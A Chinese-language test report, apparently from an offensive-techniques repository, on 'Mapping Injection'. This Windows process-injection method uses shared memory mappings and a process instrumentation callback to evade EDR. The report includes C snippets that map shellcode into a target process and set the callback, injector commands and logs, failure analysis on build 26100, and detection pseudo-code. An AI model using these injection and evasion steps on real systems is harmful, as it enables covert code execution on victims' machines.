# 技术 17: Mapping Injection 测试指南

## 技术概述

**Mapping Injection** 是一种高级隐蔽的进程注入技术，通过使用内存映射和进程插桩回调（Process Instrumentation Callback）来避免传统注入技术中被EDR严格监控的API调用。

### 核心原理

**传统注入的syscall模式**：
```
OpenProcess → VirtualAllocEx → WriteProcessMemory → CreateRemoteThread
                    ↑                  ↑                      ↑
                EDR重点监控         EDR重点监控           EDR重点监控
```

**Mapping Injection的syscall模式**：
```
OpenProcess → CreateFileMapping → MapViewOfFile3(本地) → MapViewOfFile3(远程) → NtSetInformationProcess
                    ↑                     ↑                        ↑                          ↑
                合法文件映射            写入本地映射            共享到远程进程              设置回调
```

### 关键技术点

#### 1. 内存映射（Memory Mapping）

**优势**：
- 不使用 `VirtualAllocEx` - 避免内存分配监控
- 不使用 `WriteProcessMemory` - 避免跨进程写入监控
- 两个进程共享同一块物理内存，数据自动同步

**实现**：
```c
// 1. 创建匿名文件映射对象
HANDLE hFileMap = CreateFileMapping(
    INVALID_HANDLE_VALUE,    // 匿名映射
    NULL,
    PAGE_EXECUTE_READWRITE,
    0,
    bufferSize,
    NULL
);

// 2. 映射到本地进程（用于写入数据）
LPVOID lpLocal = MapViewOfFile3(
    hFileMap,
    GetCurrentProcess(),     // 本地进程
    NULL, 0, 0, 0,
    PAGE_READWRITE,          // RW权限
    NULL, 0
);
memcpy(lpLocal, shellcode, size);

// 3. 映射到远程进程（共享数据）
LPVOID lpRemote = MapViewOfFile3(
    hFileMap,
    hTargetProcess,          // 目标进程
    NULL, 0, 0, 0,
    PAGE_EXECUTE_READ,       // RX权限
    NULL, 0
);
```

#### 2. ProcessInstrumentationCallback

**什么是Instrumentation Callback？**
- Windows性能分析机制
- 允许在进程每次syscall时插入回调
- 不需要CreateRemoteThread

**设置方式**：
```c
PROCESS_INSTRUMENTATION_CALLBACK_INFORMATION callbackInfo;
callbackInfo.Version = 0;              // 0 for x64
callbackInfo.Reserved = 0;
callbackInfo.Callback = callbackAddr;  // 远程shellcode地址

NtSetInformationProcess(
    hTargetProcess,
    ProcessInstrumentationCallback,  // = 40
    &callbackInfo,
    sizeof(callbackInfo)
);
```

**执行流程**：
```
目标进程调用syscall
    ↓
内核检测到instrumentation callback
    ↓
跳转到我们的callback地址
    ↓
执行shellcode
    ↓
恢复正常syscall执行
```

### 系统要求

- **Windows版本**: Windows 10 1703+ (build 10.0.15063+)
- **架构**: x64
- **权限**: 完整管理员权限（Administrator + SeDebugPrivilege）

## 测试环境

- **操作系统**: Windows 10.0.26100.6584
- **架构**: x64
- **权限**: 管理员 + SeDebugPrivilege

## 编译和准备

### 编译项目

```bash
cd techniques/17-mapping-injection
./build.sh
```

**输出文件**：
- `build/mapping_injection.exe` - 注入器
- `build/generate_shellcode.exe` - Shellcode生成器
- `build/payload.bin` - 默认MessageBox shellcode

### 生成测试Shellcode

```bash
# MessageBox
./build/generate_shellcode.exe messagebox build/msgbox_payload.bin

# Calculator
./build/generate_shellcode.exe calc build/calc_payload.bin
```

## 测试步骤

### 测试1：非管理员权限测试

```bash
# 启动目标进程
notepad.exe &
PID=$(tasklist | grep -i "notepad.exe" | head -1 | awk '{print $2}')

# 执行注入（非管理员）
./build/mapping_injection.exe $PID build/msgbox_payload.bin
```

**结果**：
```
========================================
  Mapping Injection
  基于内存映射的进程注入
========================================

[+] 已读取 shellcode: 325 字节
[*] 目标进程 PID: 15628
[+] 已打开目标进程

[*] 步骤 1: 分配全局变量...
  [+] 已创建文件映射对象
  [+] 已写入 1 字节到映射对象
  [+] 已映射到远程进程: 0x00000183F6F80000 (保护: 0x4)
[*] 步骤 2: 构建 callback...
[+] 最终 callback 大小: 795 字节 (callback: 470 + shellcode: 325)
[*] 步骤 3: 映射 callback 到目标进程...
  [+] 已创建文件映射对象
  [+] 已写入 795 字节到映射对象
  [+] 已映射到远程进程: 0x00000183F6F90000 (保护: 0x20)
[+] Callback 地址: 0x00000183F6F90000
[*] 步骤 4: 设置 instrumentation callback...
[!] NtSetInformationProcess 失败: 0xC0000061
[!] 你是否拥有 SeDebugPrivilege？
```

**问题**：`STATUS_PRIVILEGE_NOT_HELD (0xC0000061)`

### 测试2：完整管理员权限测试

```bash
# 以管理员身份运行
powershell -c "Start-Process -FilePath '.\build\mapping_injection.exe' -ArgumentList '80248','build\msgbox_payload.bin' -Verb RunAs -Wait"
```

**结果**：
- Notepad进程未崩溃
- 未观察到shellcode执行（无MessageBox弹出）
- 未观察到Calculator启动（使用calc payload时）
- 无任何可见效果

### 测试3：原版实现测试

**原版仓库**：https://github.com/antonioCoco/Mapping-Injection

**测试结果**：**原版在当前环境（Windows 10 build 26100）下也无法成功执行**

## 测试结果总结

| 测试项 | 配置 | 结果 | 说明 |
|--------|------|------|------|
| 非管理员权限 | notepad.exe | ❌ 失败 | 0xC0000061 权限不足 |
| 管理员权限 | notepad.exe + MessageBox | ❌ 失败 | 无可见效果 |
| 管理员权限 | notepad.exe + Calc | ❌ 失败 | 无可见效果 |
| 管理员权限 | explorer.exe | ❌ 失败 | 无可见效果 |
| **原版实现** | **任意目标** | **❌ 失败** | **确认技术在当前Windows版本失效** |

## 问题分析

### 问题1：STATUS_PRIVILEGE_NOT_HELD (0xC0000061)

**原因**：
即使启用了`SeDebugPrivilege`，`ProcessInstrumentationCallback`仍需要完整管理员权限。

**代码中已实现的权限提升**：
```c
void EnableDebugPrivilege() {
    HANDLE hToken = NULL;
    OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken);
    SetPrivilege(hToken, L"SeDebugPrivilege", TRUE);
    CloseHandle(hToken);
}
```

### 问题2：管理员权限下仍无效果

**关键发现**：即使是原版实现在当前Windows版本也无法工作

**可能原因**：

#### 1. Windows安全缓解措施演进

自Windows 10某些版本起，`ProcessInstrumentationCallback`可能受到额外限制：

- **CFG (Control Flow Guard)**：阻止未授权的控制流转移
- **CIG (Code Integrity Guard)**：禁止未签名代码执行
- **ACG (Arbitrary Code Guard)**：阻止动态代码生成
- **Instrumentation Callback限制**：可能在内核层面被限制或禁用

#### 2. Protected Process Light (PPL)

现代Windows进程（如explorer.exe）可能运行在PPL保护下，阻止外部操纵。

#### 3. 系统补丁和安全更新

Microsoft可能在安全更新中限制了`ProcessInstrumentationCallback`的使用，尤其是在build 26100这样的新版本中。

## 技术限制总结

### 已确认限制

1. **在Windows 10 build 26100上完全失效**
   - 原版实现也无法工作
   - 不是实现问题，是系统限制

2. **权限要求极高**
   - 需要完整管理员权限
   - SeDebugPrivilege不足够
   - 即使满足权限也可能失败

3. **目标进程限制**
   - Protected Process Light (PPL) 进程无法注入
   - 关键系统进程受保护

4. **Windows版本依赖性强**
   - 需要 Windows 10 1703+
   - 在最新Windows 10/11上已失效
   - 安全更新可能破坏兼容性

### 现代Windows缓解措施

| 缓解措施 | 影响 | 可能性 |
|---------|------|--------|
| Instrumentation Callback限制 | 直接阻止技术 | ✅ 确认 |
| CFG | 阻止控制流劫持 | 可能 |
| CIG | 阻止未签名代码 | 可能 |
| ACG | 阻止动态代码 | 可能 |
| PPL | 保护关键进程 | 确认 |

## 与其他技术对比

| 特性 | Mapping Injection | PE Injection | Reflective DLL |
|------|-------------------|--------------|----------------|
| VirtualAllocEx | ❌ | ✅ | ✅ |
| WriteProcessMemory | ❌ | ✅ | ✅ |
| CreateRemoteThread | ❌ | ✅ | ✅ |
| 理论隐蔽性 | 极高 | 中 | 中 |
| **实际可用性（2025）** | **❌ 已失效** | **✅ 可用** | **✅ 可用** |
| Windows 10 26100 | ❌ 不可用 | ✅ 可用 | ✅ 可用 |
| 权限要求 | 极高且无效 | 中 | 中 |
| 推荐使用 | ❌ | ✅ | ✅ |

## 检测与防御

### EDR检测方法（理论）

虽然技术已失效，但检测方法仍有参考价值：

1. **API Hook监控**
```c
Hook: kernelbase!MapViewOfFile3
  if (Process != GetCurrentProcess()) {
      if (PageProtection & PAGE_EXECUTE) {
          Alert("可疑的可执行内存映射到其他进程");
      }
  }

Hook: ntdll!NtSetInformationProcess
  if (ProcessInformationClass == 40) {  // ProcessInstrumentationCallback
      Alert("设置进程插桩回调");
      Block();  // Windows本身已经在某种程度上阻止了
  }
```

2. **内存扫描**
```c
VirtualQueryEx() {
    if (Type == MEM_MAPPED && Protect & PAGE_EXECUTE) {
        if (Shared == TRUE && !IsKnownModule()) {
            Alert("未知的共享可执行映射");
        }
    }
}
```

### Windows内置防御（已生效）

Windows 10 build 26100似乎已经内置了对此技术的防御：

1. **ProcessInstrumentationCallback限制**
   - 可能要求特殊签名
   - 可能限制在受信任进程中使用
   - 可能完全禁用该功能

2. **进程完整性检查**
   - 阻止未授权的callback设置
   - 验证callback代码来源

## 参考资料

- **原始实现**: https://github.com/antonioCoco/Mapping-Injection
- **技术博客**: https://splintercod3.blogspot.com/p/weaponizing-mapping-injection-with.html
- **MapViewOfFile3文档**: https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-mapviewoffile3
- **Hooking Nirvana**: https://github.com/ionescu007/HookingNirvana
- **README**: `techniques/17-mapping-injection/README.md`

## 结论

**Mapping Injection** 是一个理论上极其隐蔽的进程注入技术，通过避免传统注入API调用来绕过EDR检测。然而：

### ❌ 技术现状（2025年）

1. **在Windows 10 build 26100上完全失效**
2. **原版实现也无法工作**
3. **可能被Windows内核层面禁用或限制**
4. **不推荐用于任何实际用途**

### ✅ 学习价值

1. **理解内存映射机制**：CreateFileMapping + MapViewOfFile3
2. **了解ProcessInstrumentationCallback**：Windows性能分析机制
3. **认识攻防对抗演进**：技术失效是常态

### 📌 实践建议

- ❌ **不要用于实际渗透测试**（技术已失效）
- ✅ **学习思路和原理**（内存映射、syscall hook）
- ✅ **关注Windows安全机制演进**
- ✅ **优先使用稳定技术**（PE Injection、Reflective DLL均仍可用）

### 💡 关键教训

这个案例完美展示了：

1. **理论上完美的隐蔽技术，也会随着操作系统演进而失效**
2. **攻防对抗是动态的，没有永远有效的技术**
3. **Windows安全团队会针对已知技术进行缓解**
4. **即使是几年前的技术，在现代系统上可能完全失效**

**这正是"攻防对抗永无止境"的真实写照。**
